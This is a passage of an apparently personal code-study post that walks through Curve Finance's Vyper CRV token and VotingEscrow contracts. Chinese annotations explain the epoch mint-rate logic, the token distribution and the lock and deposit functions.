@dev After all is set up, admin only can change the token name\n    @param _admin New admin address\n    \"\"\"\n    assert msg.sender == self.admin  # dev: admin only\n    self.admin = _admin\n    log SetAdmin(_admin)\n\n\n@external\n@view\ndef totalSupply() -> uint256:\n    \"\"\"\n    @notice Total number of tokens in existence.\n    \"\"\"\n    return self.total_supply\n\n\n@external\n@view\ndef allowance(_owner : address, _spender : address) -> uint256:\n    \"\"\"\n    @notice Check the amount of tokens that an owner allowed to a spender\n    @param _owner The address which owns the funds\n    @param _spender The address which will spend the funds\n    @return uint256 specifying the amount of tokens still available for the spender\n    \"\"\"\n    return self.allowances[_owner][_spender]\n\n\n@external\ndef transfer(_to : address, _value : uint256) -> bool:\n    \"\"\"\n    @notice Transfer `_value` tokens from `msg.sender` to `_to`\n    @dev Vyper does not allow underflows, so the subtraction in\n         this function will revert on an insufficient balance\n    @param _to The address to transfer to\n    @param _value The amount to be transferred\n    @return bool success\n    \"\"\"\n    assert _to != ZERO_ADDRESS  # dev: transfers to 0x0 are not allowed\n    self.balanceOf[msg.sender] -= _value\n    self.balanceOf[_to] += _value\n    log Transfer(msg.sender, _to, _value)\n    return True\n\n\n@external\ndef transferFrom(_from : address, _to : address, _value : uint256) -> bool:\n    \"\"\"\n     @notice Transfer `_value` tokens from `_from` to `_to`\n     @param _from address The address which you want to send tokens from\n     @param _to address The address which you want to transfer to\n     @param _value uint256 the amount of tokens to be transferred\n     @return bool success\n    \"\"\"\n    assert _to != ZERO_ADDRESS  # dev: transfers to 0x0 are not allowed\n    # NOTE: vyper does not allow underflows\n    #       so the following subtraction would revert on insufficient balance\n    self.balanceOf[_from] -= _value\n    self.balanceOf[_to] += _value\n    self.allowances[_from][msg.sender] -= _value\n    log Transfer(_from, _to, _value)\n    return True\n\n\n@external\ndef approve(_spender : address, _value : uint256) -> bool:\n    \"\"\"\n    @notice Approve `_spender` to transfer `_value` tokens on behalf of `msg.sender`\n    @dev Approval may only be from zero -> nonzero or from nonzero -> zero in order\n        to mitigate the potential race condition described here:\n        https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n    @param _spender The address which will spend the funds\n    @param _value The amount of tokens to be spent\n    @return bool success\n    \"\"\"\n    assert _value == 0 or self.allowances[msg.sender][_spender] == 0\n    self.allowances[msg.sender][_spender] = _value\n    log Approval(msg.sender, _spender, _value)\n    return True\n\n\n@external\ndef mint(_to: address, _value: uint256) -> bool:\n    \"\"\"\n    @notice Mint `_value` tokens and assign them to `_to`\n    @dev Emits a Transfer event originating from 0x00\n    @param _to The account that will receive the created tokens\n    @param _value The amount that will be created\n    @return bool success\n    \"\"\"\n    assert msg.sender == self.minter  # dev: minter only\n    assert _to != ZERO_ADDRESS  # dev: zero address\n\n    if block.timestamp >= self.start_epoch_time + RATE_REDUCTION_TIME:\n        self._update_mining_parameters()\n\n    _total_supply: uint256 = self.total_supply + _value\n    assert _total_supply &lt;= self._available_supply()  # dev: exceeds allowable mint amount\n    self.total_supply = _total_supply\n\n    self.balanceOf[_to] += _value\n    log Transfer(ZERO_ADDRESS, _to, _value)\n\n    return True\n\n\n@external\ndef burn(_value: uint256) -> bool:\n    \"\"\"\n    @notice Burn `_value` tokens belonging to `msg.sender`\n    @dev Emits a Transfer event with a destination of 0x00\n    @param _value The amount that will be burned\n    @return bool success\n    \"\"\"\n    self.balanceOf[msg.sender] -= _value\n    self.total_supply -= _value\n\n    log Transfer(msg.sender, ZERO_ADDRESS, _value)\n    return True\n\n\n@external\ndef set_name(_name: String[64], _symbol: String[32]):\n    \"\"\"\n    @notice Change the token name and symbol to `_name` and `_symbol`\n    @dev Only callable by the admin account\n    @param _name New token name\n    @param _symbol New token symbol\n    \"\"\"\n    assert msg.sender == self.admin, \"Only admin is allowed to change name\"\n    self.name = _name\n    self.symbol = _symbol\n\n\n\nAnalyze\nThe total supply of 3.03b is distributed as such:\n\n62% to community liquidity providers\n30% to shareholders (team and investors) with 2-4 years vesting\n3% to employees with 2 years vesting\n5% to the community reserve\n\nThe initial supply of around 1.3b (~43%) is distributed as such:\n\n5% to pre-CRV liquidity providers with 1 year vesting\n30% to shareholders (team and investors) with 2-4 years vesting\n3% to employees with 2 years vesting\n5% to the community reserve\n\n@external\ndef start_epoch_time_write() -> uint256:\n    \"\"\"\n    @notice Get timestamp of the current mining epoch start\n            while simultaneously updating mining parameters\n    @return Timestamp of the epoch\n    \"\"\"\n    _start_epoch_time: uint256 = self.start_epoch_time\n    if block.timestamp >= _start_epoch_time + RATE_REDUCTION_TIME:\n        self._update_mining_parameters()\n        return self.start_epoch_time\n    else:\n        return _start_epoch_time\n\n\n@external\ndef future_epoch_time_write() -> uint256:\n    \"\"\"\n    @notice Get timestamp of the next mining epoch start\n            while simultaneously updating mining parameters\n    @return Timestamp of the next epoch\n    \"\"\"\n    _start_epoch_time: uint256 = self.start_epoch_time\n    if block.timestamp >= _start_epoch_time + RATE_REDUCTION_TIME:\n        self._update_mining_parameters()\n        return self.start_epoch_time + RATE_REDUCTION_TIME\n    else:\n        return _start_epoch_time + RATE_REDUCTION_TIME\n\n两个函数分别获取当前和下一个挖掘阶段开始的时间戳，并同时调用_update_mining_parameters函数更新参数\ndef _available_supply() -> uint256:\n    return self.start_epoch_supply + (block.timestamp - self.start_epoch_time) * self.rate\n\n\n@external\n@view\ndef available_supply() -> uint256:\n    \"\"\"\n    @notice Current number of tokens in existence (claimed or unclaimed)\n    \"\"\"\n    return self._available_supply()\n\n\n获得全部的token，包括认领以及未认领的全部\ndef mintable_in_timeframe(start: uint256, end: uint256) -> uint256:\n    \"\"\"\n    @notice How much supply is mintable from start timestamp till end timestamp\n    @param start Start of the time interval (timestamp)\n    @param end End of the time interval (timestamp)\n    @return Tokens mintable from `start` till `end`\n    \"\"\"\n    assert start &lt;= end  # dev: start > end\n    to_mint: uint256 = 0\n    current_epoch_time: uint256 = self.start_epoch_time\n    current_rate: uint256 = self.rate\n\n    # Special case if end is in future (not yet minted) epoch\n    if end > current_epoch_time + RATE_REDUCTION_TIME:\n        current_epoch_time += RATE_REDUCTION_TIME\n        current_rate = current_rate * RATE_DENOMINATOR / RATE_REDUCTION_COEFFICIENT\n\n    assert end &lt;= current_epoch_time + RATE_REDUCTION_TIME  # dev: too far in future\n\n    for i in range(999):  # Curve will not work in 1000 years. Darn!\n        if end >= current_epoch_time:\n            current_end: uint256 = end\n            if current_end > current_epoch_time + RATE_REDUCTION_TIME:\n                current_end = current_epoch_time + RATE_REDUCTION_TIME\n\n            current_start: uint256 = start\n            if current_start >= current_epoch_time + RATE_REDUCTION_TIME:\n                break  # We should never get here but what if...\n            elif current_start &lt; current_epoch_time:\n                current_start = current_epoch_time\n\n            to_mint += current_rate * (current_end - current_start)\n\n            if start >= current_epoch_time:\n                break\n\n        current_epoch_time -= RATE_REDUCTION_TIME\n        current_rate = current_rate * RATE_REDUCTION_COEFFICIENT / RATE_DENOMINATOR  # double-division with rounding made rate a bit less => good\n        assert current_rate &lt;= INITIAL_RATE  # This should never happen\n\n    return to_mint\n\n以上函数计算从开始时间到结束时间的供应量\ncase 1\n\nend&gt; current_epoch_time(will update) + RATE_REDUCTION_TIME\nstart&lt;&#x3D;current_epoch_time(updated)——&gt;return current_rate * (period)\nif start1 equal to updated start1(in case 1)，the same result\n\n\n\n\ncase 2\n\ncurrent_epoch_time&lt;end&lt;&#x3D;current_epoch_time(will update) + RATE_REDUCTION_TIME\n\nstart&lt;&#x3D;current_epoch_time(updated)——&gt;return current_rate * (period)\n\nif start1 equal to updated start1(in case 1)，the same result\n\n\n  \ncase 3\n\nend&lt; current_epoch_time\nstart&lt;&#x3D;current_epoch_time(updated)——&gt;return current_rate * (period)\nif star1 equal to updated start1(in case 1)，the same result\n\n\n\n\ncase 4\n\nend*n&lt;current_epoch_time\nfor 循环，逻辑相同\n\n\n\nVoting EscrowCode\nClick to see more\n# @version 0.2.4\n\"\"\"\n@title Voting Escrow\n@author Curve Finance\n@license MIT\n@notice Votes have a weight depending on time, so that users are\n        committed to the future of (whatever they are voting for)\n@dev Vote weight decays linearly over time. Lock time cannot be\n     more than `MAXTIME` (4 years).\n\"\"\"\n\n# Voting escrow to have time-weighted votes\n# Votes have a weight depending on time, so that users are committed\n# to the future of (whatever they are voting for).\n# The weight in this implementation is linear, and lock cannot be more than maxtime:\n# w ^\n# 1 +        /\n#   |      /\n#   |    /\n#   |  /\n#   |/\n# 0 +--------+------> time\n#       maxtime (4 years?)\n\nstruct Point:\n    bias: int128\n    slope: int128  # - dweight / dt\n    ts: uint256\n    blk: uint256  # block\n# We cannot really do block numbers per se b/c slope is per time, not per block\n# and per block could be fairly bad b/c Ethereum changes blocktimes.\n# What we can do is to extrapolate ***At functions\n\nstruct LockedBalance:\n    amount: int128\n    end: uint256\n\n\ninterface ERC20:\n    def decimals() -> uint256: view\n    def name() -> String[64]: view\n    def symbol() -> String[32]: view\n    def transfer(to: address, amount: uint256) -> bool: nonpayable\n    def transferFrom(spender: address, to: address, amount: uint256) -> bool: nonpayable\n\n\n# Interface for checking whether address belongs to a whitelisted\n# type of a smart wallet.\n# When new types are added - the whole contract is changed\n# The check() method is modifying to be able to use caching\n# for individual wallet addresses\ninterface SmartWalletChecker:\n    def check(addr: address) -> bool: nonpayable\n\nDEPOSIT_FOR_TYPE: constant(int128) = 0\nCREATE_LOCK_TYPE: constant(int128) = 1\nINCREASE_LOCK_AMOUNT: constant(int128) = 2\nINCREASE_UNLOCK_TIME: constant(int128) = 3\n\n\nevent CommitOwnership:\n    admin: address\nevent ApplyOwnership:\n    admin: address\nevent Deposit:\n    provider: indexed(address)\n    value: uint256\n    locktime: indexed(uint256)\n    type: int128\n    ts: uint256\nevent Withdraw:\n    provider: indexed(address)\n    value: uint256\n    ts: uint256\nevent Supply:\n    prevSupply: uint256\n    supply: uint256\n\n\nWEEK: constant(uint256) = 7 * 86400  # all future times are rounded by week\nMAXTIME: constant(uint256) = 4 * 365 * 86400  # 4 years\nMULTIPLIER: constant(uint256) = 10 ** 18\n\ntoken: public(address)\nsupply: public(uint256)\n\nlocked: public(HashMap[address, LockedBalance])\n\nepoch: public(uint256)\npoint_history: public(Point[100000000000000000000000000000])  # epoch -> unsigned point\nuser_point_history: public(HashMap[address, Point[1000000000]])  # user -> Point[user_epoch]\nuser_point_epoch: public(HashMap[address, uint256])\nslope_changes: public(HashMap[uint256, int128])  # time -> signed slope change\n\n# Aragon's view methods for compatibility\ncontroller: public(address)\ntransfersEnabled: public(bool)\n\nname: public(String[64])\nsymbol: public(String[32])\nversion: public(String[32])\ndecimals: public(uint256)\n\n# Checker for whitelisted (smart contract) wallets which are allowed to deposit\n# The goal is to prevent tokenizing the escrow\nfuture_smart_wallet_checker: public(address)\nsmart_wallet_checker: public(address)\n\nadmin: public(address)  # Can and will be a smart contract\nfuture_admin: public(address)\n\n\n@external\ndef __init__(token_addr: address, _name: String[64], _symbol: String[32], _version: String[32]):\n    \"\"\"\n    @notice Contract constructor\n    @param token_addr `ERC20CRV` token address\n    @param _name Token name\n    @param _symbol Token symbol\n    @param _version Contract version - required for Aragon compatibility\n    \"\"\"\n    self.admin = msg.sender\n    self.token = token_addr\n    self.point_history[0].blk = block.number\n    self.point_history[0].ts = block.timestamp\n    self.controller = msg.sender\n    self.transfersEnabled = True\n\n    _decimals: uint256 = ERC20(token_addr).decimals()\n    assert _decimals &lt;= 255\n    self.decimals = _decimals\n\n    self.name = _name\n    self.symbol = _symbol\n    self.version = _version\n\n\n@external\ndef commit_transfer_ownership(addr: address):\n    \"\"\"\n    @notice Transfer ownership of VotingEscrow contract to `addr`\n    @param addr Address to have ownership transferred to\n    \"\"\"\n    assert msg.sender == self.admin  # dev: admin only\n    self.future_admin = addr\n    log CommitOwnership(addr)\n\n\n@external\ndef apply_transfer_ownership():\n    \"\"\"\n    @notice Apply ownership transfer\n    \"\"\"\n    assert msg.sender == self.admin  # dev: admin only\n    _admin: address = self.future_admin\n    assert _admin != ZERO_ADDRESS  # dev: admin not set\n    self.admin = _admin\n    log ApplyOwnership(_admin)\n\n\n@external\ndef commit_smart_wallet_checker(addr: address):\n    \"\"\"\n    @notice Set an external contract to check for approved smart contract wallets\n    @param addr Address of Smart contract checker\n    \"\"\"\n    assert msg.sender == self.admin\n    self.future_smart_wallet_checker = addr\n\n\n@external\ndef apply_smart_wallet_checker():\n    \"\"\"\n    @notice Apply setting external contract to check approved smart contract wallets\n    \"\"\"\n    assert msg.sender == self.admin\n    self.smart_wallet_checker = self.future_smart_wallet_checker\n\n\n@internal\ndef assert_not_contract(addr: address):\n    \"\"\"\n    @notice Check if the call is from a whitelisted smart contract, revert if not\n    @param addr Address to be checked\n    \"\"\"\n    if addr != tx.origin:\n        checker: address = self.smart_wallet_checker\n        if checker != ZERO_ADDRESS:\n            if SmartWalletChecker(checker).check(addr):\n                return\n        raise \"Smart contract depositors not allowed\"\n\n\n@external\n@view\ndef get_last_user_slope(addr: address) -> int128:\n    \"\"\"\n    @notice Get the most recently recorded rate of voting power decrease for `addr`\n    @param addr Address of the user wallet\n    @return Value of the slope\n    \"\"\"\n    uepoch: uint256 = self.user_point_epoch[addr]\n    return self.user_point_history[addr][uepoch].slope\n\n\n@external\n@view\ndef user_point_history__ts(_addr: address, _idx: uint256) -> uint256:\n    \"\"\"\n    @notice Get the timestamp for checkpoint `_idx` for `_addr`\n    @param _addr User wallet address\n    @param _idx User epoch number\n    @return Epoch time of the checkpoint\n    \"\"\"\n    return self.user_point_history[_addr][_idx].ts\n\n\n@external\n@view\ndef locked__end(_addr: address) -> uint256:\n    \"\"\"\n    @notice Get timestamp when `_addr`'s lock finishes\n    @param _addr User wallet\n    @return Epoch time of the lock end\n    \"\"\"\n    return self.locked[_addr].end\n\n\n@internal\ndef _checkpoint(addr: address, old_locked: LockedBalance, new_locked: LockedBalance):\n    \"\"\"\n    @notice Record global and per-user data to checkpoint\n    @param addr User's wallet address. No user checkpoint if 0x0\n    @param old_locked Pevious locked amount / end lock time for the user\n    @param new_locked New locked amount / end lock time for the user\n    \"\"\"\n    u_old: Point = empty(Point)\n    u_new: Point = empty(Point)\n    old_dslope: int128 = 0\n    new_dslope: int128 = 0\n    _epoch: uint256 = self.epoch\n\n    if addr != ZERO_ADDRESS:\n        # Calculate slopes and biases\n        # Kept at zero when they have to\n        if old_locked.end > block.timestamp and old_locked.amount > 0:\n            u_old.slope = old_locked.amount / MAXTIME\n            u_old.bias = u_old.slope * convert(old_locked.end - block.timestamp, int128)\n        if new_locked.end > block.timestamp and new_locked.amount > 0:\n            u_new.slope = new_locked.amount / MAXTIME\n            u_new.bias = u_new.slope * convert(new_locked.end - block.timestamp, int128)\n\n        # Read values of scheduled changes in the slope\n        # old_locked.end can be in the past and in the future\n        # new_locked.end can ONLY by in the FUTURE unless everything expired: than zeros\n        old_dslope = self.slope_changes[old_locked.end]\n        if new_locked.end != 0:\n            if new_locked.end == old_locked.end:\n                new_dslope = old_dslope\n            else:\n                new_dslope = self.slope_changes[new_locked.end]\n\n    last_point: Point = Point(&#123;bias: 0, slope: 0, ts: block.timestamp, blk: block.number&#125;)\n    if _epoch > 0:\n        last_point = self.point_history[_epoch]\n    last_checkpoint: uint256 = last_point.ts\n    # initial_last_point is used for extrapolation to calculate block number\n    # (approximately, for *At methods) and save them\n    # as we cannot figure that out exactly from inside the contract\n    initial_last_point: Point = last_point\n    block_slope: uint256 = 0  # dblock/dt\n    if block.timestamp > last_point.ts:\n        block_slope = MULTIPLIER * (block.number - last_point.blk) / (block.timestamp - last_point.ts)\n    # If last point is already recorded in this block, slope=0\n    # But that's ok b/c we know the block in such case\n\n    # Go over weeks to fill history and calculate what the current point is\n    t_i: uint256 = (last_checkpoint / WEEK) * WEEK\n    for i in range(255):\n        # Hopefully it won't happen that this won't get used in 5 years!\n        # If it does, users will be able to withdraw but vote weight will be broken\n        t_i += WEEK\n        d_slope: int128 = 0\n        if t_i > block.timestamp:\n            t_i = block.timestamp\n        else:\n            d_slope = self.slope_changes[t_i]\n        last_point.bias -= last_point.slope * convert(t_i - last_checkpoint, int128)\n        last_point.slope += d_slope\n        if last_point.bias &lt; 0:  # This can happen\n            last_point.bias = 0\n        if last_point.slope &lt; 0:  # This cannot happen - just in case\n            last_point.slope = 0\n        last_checkpoint = t_i\n        last_point.ts = t_i\n        last_point.blk = initial_last_point.blk + block_slope * (t_i - initial_last_point.ts) / MULTIPLIER\n        _epoch += 1\n        if t_i == block.timestamp:\n            last_point.blk = block.number\n            break\n        else:\n            self.point_history[_epoch] = last_point\n\n    self.epoch = _epoch\n    # Now point_history is filled until t=now\n\n    if addr != ZERO_ADDRESS:\n        # If last point was in this block, the slope change has been applied already\n        # But in such case we have 0 slope(s)\n        last_point.slope += (u_new.slope - u_old.slope)\n        last_point.bias += (u_new.bias - u_old.bias)\n        if last_point.slope &lt; 0:\n            last_point.slope = 0\n        if last_point.bias &lt; 0:\n            last_point.bias = 0\n\n    # Record the changed point into history\n    self.point_history[_epoch] = last_point\n\n    if addr != ZERO_ADDRESS:\n        # Schedule the slope changes (slope is going down)\n        # We subtract new_user_slope from [new_locked.end]\n        # and add old_user_slope to [old_locked.end]\n        if old_locked.end > block.timestamp:\n            # old_dslope was &lt;something> - u_old.slope, so we cancel that\n            old_dslope += u_old.slope\n            if new_locked.end == old_locked.end:\n                old_dslope -= u_new.slope  # It was a new deposit, not extension\n            self.slope_changes[old_locked.end] = old_dslope\n\n        if new_locked.end > block.timestamp:\n            if new_locked.end > old_locked.end:\n                new_dslope -= u_new.slope  # old slope disappeared at this point\n                self.slope_changes[new_locked.end] = new_dslope\n            # else: we recorded it already in old_dslope\n\n        # Now handle user history\n        user_epoch: uint256 = self.user_point_epoch[addr] + 1\n\n        self.user_point_epoch[addr] = user_epoch\n        u_new.ts = block.timestamp\n        u_new.blk = block.number\n        self.user_point_history[addr][user_epoch] = u_new\n\n\n@internal\ndef _deposit_for(_addr: address, _value: uint256, unlock_time: uint256, locked_balance: LockedBalance, type: int128):\n    \"\"\"\n    @notice Deposit and lock tokens for a user\n    @param _addr User's wallet address\n    @param _value Amount to deposit\n    @param unlock_time New time when to unlock the tokens, or 0 if unchanged\n    @param locked_balance Previous locked amount / timestamp\n    \"\"\"\n    _locked: LockedBalance = locked_balance\n    supply_before: uint256 = self.supply\n\n    self.supply = supply_before + _value\n    old_locked: LockedBalance = _locked\n    # Adding to existing lock, or if a lock is expired - creating a new one\n    _locked.amount += convert(_value, int128)\n    if unlock_time != 0:\n        _locked.end = unlock_time\n    self.locked[_addr] = _locked\n\n    # Possibilities:\n    # Both old_locked.end could be current or expired (>/&lt; block.timestamp)\n    # value == 0 (extend lock) or value > 0 (add to lock or extend lock)\n    # _locked.end > block.timestamp (always)\n    self._checkpoint(_addr, old_locked, _locked)\n\n    if _value != 0:\n        assert ERC20(self.token).transferFrom(_addr, self, _value)\n\n    log Deposit(_addr, _value, _locked.end, type, block.timestamp)\n    log Supply(supply_before, supply_before + _value)\n\n\n@external\ndef checkpoint():\n    \"\"\"\n    @notice Record global data to checkpoint\n    \"\"\"\n    self._checkpoint(ZERO_ADDRESS, empty(LockedBalance), empty(LockedBalance))\n\n\n@external\n@nonreentrant('lock')\ndef deposit_for(_addr: address, _value: uint256):\n    \"\"\"\n    @notice Deposit `_value` tokens for `_addr` and add to the lock\n    @dev Anyone (even a smart contract) can deposit for someone else, but\n         cannot extend their locktime and deposit for a brand new user\n    @param _addr User's wallet address\n    @param _value Amount to add to user's lock\n    \"\"\"\n    _locked: LockedBalance = self.locked[_addr]\n\n    assert _value > 0  # dev: need non-zero value\n    assert _locked.amount > 0, \"No existing lock found\"\n    assert _locked.end > block.timestamp, \"Cannot add to expired lock. Withdraw\"\n\n    self._deposit_for(_addr, _value, 0, self.locked[_addr], DEPOSIT_FOR_TYPE)\n\n\n@external\n@nonreentrant('lock')\ndef create_lock(_value: uint256, _unlock_time: uint256):\n    \"\"\"\n    @notice Deposit `_value` tokens for `msg.sender` and lock until `_unlock_time`\n    @param _value Amount to deposit\n    @param _unlock_time Epoch time when tokens unlock, rounded down to whole weeks\n    \"\"\"\n    self.assert_not_contract(msg.sender)\n    unlock_time: uint256 = (_unlock_time / WEEK) * WEEK  # Locktime is rounded down to weeks\n    _locked: LockedBalance = self.locked[msg.sender]\n\n    assert _value > 0  # dev: need non-zero value\n    assert _locked.amount == 0, \"Withdraw old tokens first\"\n    assert unlock_time > block.timestamp, \"Can only lock until time in the future\"\n    assert unlock_time &lt;= block.timestamp + MAXTIME, \"Voting lock can be 4 years max\"\n\n    self._deposit_for(msg.sender, _value, unlock_time, _locked, CREATE_LOCK_TYPE)\n\n\n@external\n@nonreentrant('lock')\ndef increase_amount(_value: uint256):\n    \"\"\"\n    @notice Deposit `_value` additional tokens for `msg.sender`\n            without modifying the unlock time\n    @param _value Amount of tokens to deposit and add to the lock\n    \"\"\"\n    self.assert_not_contract(msg.sender)\n    _locked: LockedBalance = self.locked[msg.sender]\n\n    assert _value > 0  # dev: need non-zero value\n    assert _locked.amount > 0, \"No existing lock found\"\n    assert _locked.end > block.timestamp, \"Cannot add to expired lock. Withdraw\"\n\n    self._deposit_for(msg.sender, _value, 0, _locked, INCREASE_LOCK_AMOUNT)\n\n\n@external\n@nonreentrant('lock')\ndef increase_unlock_time(_unlock_time: uint256):\n    \"\"\"\n    @notice Extend the unlock time for `msg.sender` to `_unlock_time`\n    @param _unlock_time New epoch time for unlocking\n    \"\"\"\n    self.assert_not_contract(msg.sender)\n    _locked: LockedBalance = self.locked[msg.sender]\n    unlock_time: uint256 = (_unlock_time / WEEK) * WEEK  # Locktime is rounded down to weeks\n\n    assert _locked.end > block.timestamp, \"Lock expired\"\n    assert _locked.amount > 0, \"Nothing is locked\"\n    assert unlock_time > _locked.end, \"Can only increase lock duration\"\n    assert unlock_time &lt;= block.timestamp + MAXTIME, \"Voting lock can be 4 years max\"\n\n    self._deposit_for(msg.sender, 0, unlock_time, _locked, INCREASE_UNLOCK_TIME)\n\n\n@external\n@nonreentrant('lock')\ndef withdraw():\n    \"\"\"\n    @notice Withdraw all tokens for `msg.sender`\n    @dev Only possible if the lock has expired\n    \"\"\"\n    _locked: LockedBalance = self.locked[msg.sender]\n    assert block.timestamp >= _locked.end, \"The lock didn't expire\"\n    value: uint256 = convert(_locked.amount, uint256)\n\n    old_locked: LockedBalance = _locked\n    _locked.end = 0\n    _locked.amount = 0\n    self.locked[msg.sender] = _locked\n    supply_before: uint256 = self.supply\n    self.supply = supply_before - value\n\n    # old_locked can have either expired &lt;= timestamp or zero end\n    # _locked has only 0 end\n    # Both can have >= 0 amount\n    self._checkpoint(msg.sender, old_locked, _locked)\n\n    assert ERC20(self.token).transfer(msg.sender, value)\n\n    log Withdraw(msg.sender, value, block.timestamp)\n    log Supply(supply_before, supply_before - value)\n\n\n# The following ERC20/minime-compatible methods are not real balanceOf and supply!\n# They measure the weights for the purpose of voting, so they don't represent\n# real coins.\n\n@internal\n@view\ndef find_block_epoch(_block: uint256, max_epoch: uint256) -> uint256:\n    \"\"\"\n    @notice Binary search to estimate timestamp for block number\n    @param _block Block to find\n    @param max_epoch Don't go beyond this epoch\n    @return Approximate timestamp for block\n    \"\"\"\n    # Binary search\n    _min: uint256 = 0\n    _max: uint256 = max_epoch\n    for i in range(128):  # Will be always enough for 128-bit numbers\n        if _min >= _max:\n            break\n        _mid: uint256 = (_min + _max + 1) / 2\n        if self.point_history[_mid].blk &lt;= _block:\n            _min = _mid\n        else:\n            _max = _mid - 1\n    return _min\n\n\n@external\n@view\ndef balanceOf(addr: address, _t: uint256 = block.timestamp) -> uint256:\n    \"\"\"\n    @notice Get the current voting power for `msg.sender`\n    @dev Adheres to the ERC20 `balanceOf` interface for Aragon compatibility\n    @param addr User wallet address\n    @param _t Epoch time to return voting power at\n    @return User voting power\n    \"\"\"\n    _epoch: uint256 = self.user_point_epoch[addr]\n    if _epoch == 0:\n        return 0\n    else:\n        last_point: Point = self.user_point_history[addr][_epoch]\n        last_point.bias -= last_point.slope * convert(_t - last_point.ts, int128)\n        if last_point.bias &lt; 0:\n            last_point.bias = 0\n        return convert(last_point.bias, uint256)\n\n\n@external\n@view\ndef balanceOfAt(addr: address, _block: uint256) -> uint256:\n    \"\"\"\n    @notice Measure voting power of `addr` at block height `_block`\n    @dev Adheres to MiniMe `balanceOfAt` interface: https://github.com/Giveth/minime\n    @param addr User's wallet address\n    @param _block Block to calculate the voting power at\n    @return Voting power\n    \"\"\"\n    # Copying and pasting totalSupply code because Vyper cannot pass by\n    # reference yet\n    assert _block &lt;= block.number\n\n    # Binary search\n    _min: uint256 = 0\n    _max: uint256 = self.user_point_epoch[addr]\n    for i in range(128):  # Will be always enough for 128-bit numbers\n        if _min >= _max:\n            break\n        _mid: uint256 = (_min + _max + 1) / 2\n        if self.user_point_history[addr][_mid].blk &lt;= _block:\n            _min = _mid\n        else:\n            _max = _mid - 1\n\n    upoint: Point = self.user_point_history[addr][_min]\n\n    max_epoch: uint256 = self.epoch\n    _epoch: uint256 = self.find_block_epoch(_block, max_epoch)\n    point_0: Point = self.point_history[_epoch]\n    d_block: uint256 = 0\n    d_t: uint256 = 0\n    if _epoch &lt; max_epoch:\n        point_1: Point = self.point_history[_epoch + 1]\n        d_block = point_1.blk - point_0.blk\n        d_t = point_1.ts - point_0.ts\n    else:\n        d_block = block.number - point_0.blk\n        d_t = block.timestamp - point_0.ts\n    block_time: uint256 = point_0.ts\n    if d_block != 0:\n        block_time += d_t * (_block - point_0.blk) / d_block\n\n    upoint.bias -= upoint.slope * convert(block_time - upoint.ts, int128)\n    if upoint.bias >= 0:\n        return convert(upoint.bias, uint256)\n    else:\n        return 0\n\n\n@internal\n@view\ndef supply_at(point: Point, t: uint256) -> uint256:\n    \"\"\"\n    @notice Calculate total voting power at some point in the past\n    @param point The point (bias/slope) to start search from\n    @param t Time to calculate the total voting power at\n    @return Total voting power at that time\n    \"\"\"\n    last_point: Point = point\n    t_i: uint256 = (last_point.ts / WEEK) * WEEK\n    for i in range(255):\n        t_i += WEEK\n        d_slope: int128 = 0\n        if t_i > t:\n            t_i = t\n        else:\n            d_slope = self.slope_changes[t_i]\n        last_point.bias -= last_point.slope * convert(t_i - last_point.ts, int128)\n        if t_i == t:\n            break\n        last_point.slope += d_slope\n        last_point.ts = t_i\n\n    if last_point.bias &lt; 0:\n        last_point.bias = 0\n    return convert(last_point.bias, uint256)\n\n\n@external\n@view\ndef totalSupply(t: uint256 = block.timestamp) -> uint256:\n    \"\"\"\n    @notice Calculate total voting power\n    @dev Adheres to the ERC20 `totalSupply` interface for Aragon compatibility\n    @return Total voting power\n    \"\"\"\n    _epoch: uint256 = self.epoch\n    last_point: Point = self.point_history[_epoch]\n    return self.supply_at(last_point, t)\n\n\n@external\n@view\ndef totalSupplyAt(_block: uint256) -> uint256:\n    \"\"\"\n    @notice Calculate total voting power at some point in the past\n    @param _block Block to calculate the total voting power at\n    @return Total voting power at `_block`\n    \"\"\"\n    assert _block &lt;= block.number\n    _epoch: uint256 = self.epoch\n    target_epoch: uint256 = self.find_block_epoch(_block, _epoch)\n\n    point: Point = self.point_history[target_epoch]\n    dt: uint256 = 0\n    if target_epoch &lt; _epoch:\n        point_next: Point = self.point_history[target_epoch + 1]\n        if point.blk != point_next.blk:\n            dt = (_block - point.blk) * (point_next.ts - point.ts) / (point_next.blk - point.blk)\n    else:\n        if point.blk != block.number:\n            dt = (_block - point.blk) * (block.timestamp - point.ts) / (block.number - point.blk)\n    # Now dt contains info on how far are we beyond point\n\n    return self.supply_at(point, point.ts + dt)\n\n\n# Dummy methods for compatibility with Aragon\n\n@external\ndef changeController(_newController: address):\n    \"\"\"\n    @dev Dummy method required for Aragon compatibility\n    \"\"\"\n    assert msg.sender == self.controller\n    self.controller = _newController\n\n\n\nAnalyzedeposit_for，create_lock，increase_amount，increase_unlock_time，withdraw函数分别是存，创建（结束上一次lock并取出token），增加，延长，取款函数，核心函数为：\n@internal\ndef _deposit_for(_addr: address, _value: uint256, unlock_time: uint256, locked_balance: LockedBalance, type: int128):\n    \"\"\"\n    @notice Deposit and lock tokens for a user\n    @param _addr User's wallet address\n    @param _value Amount to deposit\n    @param unlock_time New time when to unlock the tokens, or 0 if unchanged\n    @param locked_balance Previous locked amount / timestamp\n    \"\"\"\n    _locked: LockedBalance = locked_balance\n    supply_before: uint256 = self.supply\n\n    self.supply = supply_before + _value\n    old_locked: LockedBalance = _locked\n    # Adding to existing lock, or if a lock is expired - creating a new one\n    _locked.amount += convert(_value, int128)\n    if unlock_time != 0:\n        _locked.end = unlock_time\n    self.locked[_addr] = _locked\n\n    # Possibilities:\n    # Both old_locked.end could be current or expired (>/&lt; block.timestamp)\n    # value == 0 (extend lock) or value > 0 (add to lock or extend lock)\n    # _locked.end > block.timestamp (always)\n    self._checkpoint(_addr, old_locked, _locked)\n\n    if _value != 0:\n        assert ERC20(self.token).transferFrom(_addr, self, _value)\n\n    log Deposit(_addr, _value, _locked.end, type, block.timestamp)\n    log Supply(supply_before, supply_before + _value)\n\n更新合约的supply以及addr对应的locked amount以及unlock tome同时转账对应金额到合约内，每次被调用都会触发_checkpoint函数：\ndef _checkpoint(addr: address, old_locked: LockedBalance, new_locked: LockedBalance):\n    \"\"\"\n    @notice Record global and per-user data to checkpoint\n    @param addr User's wallet address. No user checkpoint if 0x0\n    @param old_locked Pevious locked amount / end lock time for the user\n    @param new_locked New locked amount / end lock time for the user\n    \"\"\"\n    u_old: Point = empty(Point)\n    u_new: Point = empty(Point)\n    old_dslope: int128 = 0\n    new_dslope: int128 = 0\n    _epoch: uint256 = self.epoch\n\n    if addr != ZERO_ADDRESS:\n        # Calculate slopes and biases\n        # Kept at zero when they have to\n        if 